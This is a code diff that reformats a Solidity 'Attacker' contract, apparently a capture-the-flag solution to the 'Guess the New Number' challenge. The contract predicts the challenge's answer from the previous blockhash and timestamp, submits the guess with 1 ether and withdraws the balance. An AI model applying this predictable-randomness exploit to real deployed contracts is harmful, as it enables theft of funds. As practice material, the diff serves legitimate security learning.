@@ -18,12 +18,12 @@ contract Attacker {
         if (msg.value != 1 ether) revert ValueErr();
 
         IGuessTheNewNumberChallenge challenge = IGuessTheNewNumberChallenge(_challenge);
-        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
         challenge.guess{value: 1 ether}(answer);
-        
+
         if (!challenge.isComplete()) revert GuessErr();
 
-        payable(msg.sender).transfer(address(this).balance);        
+        payable(msg.sender).transfer(address(this).balance);
     }
 
     receive() external payable {}
@@ -31,5 +31,5 @@ contract Attacker {
 
 interface IGuessTheNewNumberChallenge {
     function guess(uint8 n) external payable;
-    function isComplete() external view returns(bool);
+    function isComplete() external view returns (bool);
 }
